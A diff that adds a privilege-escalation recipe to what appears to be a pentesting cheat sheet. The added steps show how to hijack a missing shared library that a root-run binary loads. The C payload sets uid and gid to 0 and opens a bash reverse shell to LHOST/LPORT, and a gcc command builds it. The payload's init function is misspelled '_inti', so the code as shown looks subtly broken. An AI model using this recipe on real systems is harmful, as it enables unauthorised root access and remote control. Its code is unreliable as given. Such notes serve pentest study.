@@ -32,3 +32,32 @@
 ```
 find / -group filter 2>/dev/null
 ```
+
+## Binary Missing Component
+1. You find a binary file that may be run by root user (SUID or SUDO or CronJob)
+2. Try to run it
+3. If it gives missing like "cannot open shared object file"
+4. Check path `LD_LIBRARY_PATH` in `/etc/crontab` for example.
+5. Find writable directory
+```
+find / -type d -writable 2>/dev/null
+```
+6. Match writable directories with PATH
+7. Write a malicious .c file
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _inti() {
+  setgid(0);
+  setuid(0);
+  system("bash -i >& /dev/tcp/LHOST/LPORT 0>&1");
+}
+```
+8. Compile it
+```
+gcc -shared -fPIC -nostartfiles exploit.c -o exploit.so
+```
+9. Put it to the target place
+10. Run the binary
